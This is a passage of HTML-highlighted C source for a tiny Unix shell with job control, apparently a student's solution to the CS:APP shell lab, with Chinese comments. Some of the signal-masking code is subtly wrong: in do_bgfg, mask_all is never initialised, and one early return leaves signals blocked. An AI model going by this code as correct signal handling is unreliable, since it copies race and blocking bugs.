class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Misc manifest constants */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE 1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS 128    <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJOBS 16     <span class="comment">/* max jobs at any point in time */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJID 1 &lt;&lt; 16 <span class="comment">/* max job ID */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Job states */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNDEF 0 <span class="comment">/* undefined */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FG 1    <span class="comment">/* running in foreground */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BG 2    <span class="comment">/* running in background */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ST 3    <span class="comment">/* stopped */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;   <span class="comment">/* defined in libc */</span></span><br><span class="line"><span class="keyword">char</span> prompt[] = <span class="string">&quot;tsh&gt; &quot;</span>; <span class="comment">/* command line prompt (DO NOT CHANGE) */</span></span><br><span class="line"><span class="keyword">int</span> verbose = <span class="number">0</span>;         <span class="comment">/* if true, print additional output */</span></span><br><span class="line"><span class="keyword">int</span> nextjid = <span class="number">1</span>;         <span class="comment">/* next job ID to allocate */</span></span><br><span class="line"><span class="keyword">char</span> sbuf[MAXLINE];      <span class="comment">/* for composing sprintf messages */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span></span></span><br><span class="line"><span class="class">&#123;</span>                          <span class="comment">/* The job struct */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;             <span class="comment">/* job PID */</span></span><br><span class="line">    <span class="keyword">int</span> jid;               <span class="comment">/* job ID [1, 2, ...] */</span></span><br><span class="line">    <span class="keyword">int</span> state;             <span class="comment">/* UNDEF, BG, FG, or ST */</span></span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE]; <span class="comment">/* command line */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> <span class="title">jobs</span>[<span class="title">MAXJOBS</span>];</span> <span class="comment">/* The job list */</span></span><br><span class="line"><span class="comment">/* End global variables */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are the functions that you will implement */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we&#x27;ve provided for you */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fgpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">void</span> <span class="title">handler_t</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * main - The shell&#x27;s main routine </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* emit prompt (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect stderr to stdout (so that driver will get all output</span></span><br><span class="line"><span class="comment">     * on the pipe connected to stdout) */</span></span><br><span class="line">    dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the command line */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;hvp&quot;</span>)) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (c)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>: <span class="comment">/* print help message */</span></span><br><span class="line">            usage();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>: <span class="comment">/* emit additional diagnostic info */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:            <span class="comment">/* don&#x27;t print a prompt */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>; <span class="comment">/* handy for automatic testing */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install the signal handlers */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* These are the ones you will need to implement */</span></span><br><span class="line">    Signal(SIGINT, sigint_handler);   <span class="comment">/* ctrl-c */</span></span><br><span class="line">    Signal(SIGTSTP, sigtstp_handler); <span class="comment">/* ctrl-z */</span></span><br><span class="line">    Signal(SIGCHLD, sigchld_handler); <span class="comment">/* Terminated or stopped child */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This one provides a clean way to kill the shell */</span></span><br><span class="line">    Signal(SIGQUIT, sigquit_handler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the job list */</span></span><br><span class="line">    initjobs(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Execute the shell&#x27;s read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read command line */</span></span><br><span class="line">        <span class="keyword">if</span> (emit_prompt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">            app_error(<span class="string">&quot;fgets error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>))</span><br><span class="line">        &#123; <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Evaluate the command line */</span></span><br><span class="line">        eval(cmdline);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bg;                               <span class="comment">// 是否是后台程序</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];                    <span class="comment">// cmd copy</span></span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS];                  <span class="comment">// 解析后的命令</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;                       <span class="comment">// 子进程id</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, pre_one; <span class="comment">// 用于同步</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化blocking mask</span></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正式执行命令</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 外部命令</span></span><br><span class="line">        <span class="keyword">if</span> (access(argv[<span class="number">0</span>], F_OK) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 能够运行的外部命令</span></span><br><span class="line">        <span class="comment">// Parent: 在fork前，block SIGCHLD 信号，避免在addjob之前Child结束，触发sigchld_handler,从而deltejob比addjob先执行</span></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;pre_one);</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>)</span><br><span class="line">        &#123;                  <span class="comment">// Child</span></span><br><span class="line">            setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 改变组id，避免信号的自动传送(write up中有更相似的描述)</span></span><br><span class="line">            <span class="comment">// 执行exec之前，解除从Parent中继承过来的block_mask</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">// 执行</span></span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                unix_error(<span class="string">&quot;execve child process error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; <span class="comment">// Parent</span></span><br><span class="line">            <span class="comment">// addjob, block所有信号，避免竞争问题</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">            addjob(jobs, pid,</span><br><span class="line">                   bg ? BG : FG,</span><br><span class="line">                   buf);</span><br><span class="line">            <span class="comment">// 还原信号</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Parent: 前台进程处理</span></span><br><span class="line">        <span class="keyword">if</span> (!bg)</span><br><span class="line">        &#123;</span><br><span class="line">            waitfg(pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 在这里输出，耦合了addjob函数(内部对nextjid++)，如何优化？</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s &amp;\n&quot;</span>, nextjid - <span class="number">1</span>, pid, argv[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] = <span class="string">&#x27; &#x27;</span>;   <span class="comment">/* replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">        buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf++;</span><br><span class="line">        delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim)</span><br><span class="line">    &#123;</span><br><span class="line">        argv[argc++] = buf;</span><br><span class="line">        *delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        buf = delim + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">            buf++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            buf++;</span><br><span class="line">            delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>) <span class="comment">/* ignore blank line */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc - <span class="number">1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *cmd = argv[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 检查合法性</span></span><br><span class="line">    <span class="keyword">if</span> (!cmd || !<span class="built_in">strlen</span>(cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cmmond not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判定4种内置命令</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;quit&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 考虑当前还有后台进程，需要kill</span></span><br><span class="line">        <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line">        sigfillset(&amp;mask_all);</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// 先kill 所有子进程</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (jobs[i].pid)</span><br><span class="line">            &#123;</span><br><span class="line">                kill(jobs[i].pid, SIGKILL);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        clearjob(jobs);</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 退出</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;jobs&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;fg&quot;</span>, cmd) || !<span class="built_in">strcmp</span>(<span class="string">&quot;bg&quot;</span>, cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* not a builtin command */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span>本函数假设argv[0] 只能 = fg 或者 = bg</span></span><br><span class="line">    <span class="keyword">char</span> *arg = argv[<span class="number">1</span>]; <span class="comment">// 命令参数</span></span><br><span class="line">    <span class="keyword">int</span> jid = <span class="number">-1</span>, pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, pre_one;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 命令是否有效？</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数后续是否全是数字</span></span><br><span class="line">    <span class="keyword">if</span> (arg[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        arg++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (*arg != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*arg))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arg++;</span><br><span class="line">    &#125;</span><br><span class="line">    arg = argv[<span class="number">1</span>]; <span class="comment">// 还原</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取job</span></span><br><span class="line">    <span class="keyword">if</span> (arg[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// jid mod</span></span><br><span class="line">        jid = atoi(arg + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// pid mod</span></span><br><span class="line">        pid = atoi(arg);</span><br><span class="line">        jid = pid2jid(pid);</span><br><span class="line">    &#125;</span><br><span class="line">    job = getjobjid(jobs, jid);</span><br><span class="line">    <span class="keyword">if</span> (!job)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (arg[<span class="number">0</span>] != <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, jid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;fg&quot;</span>, argv[<span class="number">0</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// fg mode</span></span><br><span class="line">        <span class="comment">// 后台进程转前台</span></span><br><span class="line">        <span class="keyword">if</span> (job-&gt;state == FG)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;process is foreground already\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (job-&gt;state == ST)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ST -&gt; RUNNING</span></span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 测试后发现，发送SIGCONT后，也会触发一次SIGCHLD,目前原因未知</span></span><br><span class="line">            kill(job-&gt;pid, SIGCONT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="number">0</span>);</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;bg&quot;</span>, argv[<span class="number">0</span>]))</span><br><span class="line">    &#123; <span class="comment">// bg mode</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;pre_one);</span><br><span class="line">        <span class="comment">// 后台stop进程转running进程</span></span><br><span class="line">        <span class="keyword">if</span> (job-&gt;state != ST)</span><br><span class="line">        &#123;</span><br><span class="line">            <span 